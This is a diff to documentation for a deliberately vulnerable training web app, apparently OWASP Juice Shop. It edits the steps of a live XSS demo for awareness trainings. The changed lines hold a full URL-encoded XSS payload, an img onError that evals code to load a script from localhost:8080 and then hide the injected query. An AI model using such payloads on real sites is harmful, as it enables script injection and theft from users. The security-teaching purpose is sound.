@@ -137,7 +137,7 @@ is provided explicitly for live demos and awareness trainings:
 4. Turn on your speakers and make sure your browser is allowed to play
    sound.
 5. Open
-   [this link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dapple%22%3BsearchQuery.value%20%3D%20%22apple%22%3B%60%29%27%3C%2Fimg%3Eapple)
+   [this link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp)
    to launch the XSS demo (🔊).
 6. Use the application normally, e.g. doing a search and logging in with
    some user.
@@ -150,5 +150,5 @@ is provided explicitly for live demos and awareness trainings:
     removed during the reload.
 
 There is also a video recording available on YouTube:
-<https://www.youtube.com/watch?v=L7ZEMWRm7LA>. This is a good fallback
+<https://youtu.be/Msi52Kicb-w>. This is a good fallback
 in case the Docker-based setup does not work for you.
